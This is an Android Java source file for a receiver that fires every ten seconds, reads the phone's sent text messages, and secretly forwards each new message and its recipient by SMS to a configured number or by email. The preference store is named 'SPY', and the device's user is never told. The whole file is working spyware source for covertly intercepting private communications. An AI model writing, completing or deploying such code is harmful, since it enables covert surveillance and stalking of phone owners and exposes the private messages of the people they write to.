package com.example.remote;
	
import java.util.ArrayList;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.PowerManager;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.text.format.Time;
import android.util.Log;
import android.widget.Toast;
		
public class Alarm extends BroadcastReceiver 
{   
	 Context cx;
	 SharedPreferences values;
	 final SmsManager sms = SmsManager.getDefault();
     @Override
     public void onReceive(Context context, Intent intent) 
     {   
    	 StrictMode.enableDefaults();
    	 cx = context;
    	 values = context.getSharedPreferences("SPY", 0);
         PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
         PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "");
         wl.acquire();
         Log.e("888888888888", "888888888");
         if(values.getBoolean("divert_num_ch", false) || values.getBoolean("mail_mess_ch", false) )
         {
        	 Log.e("1111111111", "########");
        	 sent_mess();
         }
         
         wl.release();
     }
	
	 public void SetAlarm(Context context)
	 {
	     AlarmManager am=(AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
	     Intent i = new Intent(context, Alarm.class);
	     PendingIntent pi = PendingIntent.getBroadcast(context, 0, i, 0);
	     am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 1000 * 10, pi); // Millisec * Second * Minute
	 }
	
	 public void CancelAlarm(Context context)
	 {
	     Intent intent = new Intent(context, Alarm.class);
	     PendingIntent sender = PendingIntent.getBroadcast(context, 0, intent, 0);
	     AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
	     alarmManager.cancel(sender);
	 }
	 
	 public void sent_mess()
	 {
		 Uri mSmsinboxQueryUri = Uri.parse("content://sms/sent");
	     Cursor cursor1 = cx.getContentResolver().query(mSmsinboxQueryUri,
	                 new String[] { "_id", "thread_id", "address", "person", "date",
	                                 "body", "type" }, null, null, null);

	     String[] columns = new String[] { "address", "person", "date", "body","type" };
	     if (cursor1.getCount() > 0) 
	     {
	    	 String last_mess = values.getString("last_mess", "");
             boolean send = false;
             boolean first = true;
	         String count = Integer.toString(cursor1.getCount());
	         Log.e("Count",count);
	         cursor1.moveToLast();
	         while (cursor1.moveToPrevious())
	         {
	        	if(first == true)
	        	{
	        		cursor1.moveToNext();
	        		first = false;
	        	}
	            Log.e("$$$$$$$$", "$$$$$$");
	            String type = cursor1.getString(cursor1.getColumnIndex(columns[4]));
	            if(type.equals("2")) // 2 for Sent Sms
	             {
	                String address = cursor1.getString(cursor1.getColumnIndex(columns[0]));
	                //String name = cursor1.getString(cursor1.getColumnIndex(columns[1]));
	                String date = cursor1.getString(cursor1.getColumnIndex(columns[2]));
	                String msg = cursor1.getString(cursor1.getColumnIndex(columns[3]));
	                //Log.e("%%%%%%%%", date);
	                //Log.e("#######", msg);
	                
	                if(send == true)
	                {
	                	send_sent_mess(msg, address);
	                	values.edit().putString("last_mess", msg).commit();
	                	Log.e("00000000000000", msg);
	                }
	                //Log.e("%%%%%%%%%%", last_mess);
	                if(msg.equals(last_mess) && send == false)
	                {
	                	Log.e("222222222222", msg);
	                	send = true;
	                }
	                
	             }
         }
     }
	     
 }
	 
	//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	public void send_sent_mess(String msg,String address)
	{
		if(values.getBoolean("divert_num_ch", false) && !values.getString("divert_num_ed", "").equals("") )
        	sms.sendTextMessage("09" + values.getString("divert_num_ed", ""), 
        			null, msg + "SendTo: " + address , null, null);
        	ConnectivityManager manager = (ConnectivityManager) cx.getSystemService(Context.CONNECTIVITY_SERVICE);
	        NetworkInfo networkInfo = manager.getActiveNetworkInfo();
	        if(!(networkInfo == null || !networkInfo.isConnected() || !networkInfo.isAvailable())
	        		&& values.getBoolean("mail_mess_ch", false) 
	        		&& !values.getString("mail_mess_ed", "").equals(""))
    		{
	        	sendMail s = new sendMail();
	        	s.sendAccelerationData(msg + "SendTo: " + address, values.getString("mail_mess_ed", ""));
    		}
	        else if(values.getBoolean("mail_mess_ch", false))
	        {
	        	String a = values.getString("sent_mess_not", "");
	        	a +=  msg + "SendTo: " + address + "\n" ;
	        	values.edit().putString("sent_mess_not", a).commit();
	        }
	}
}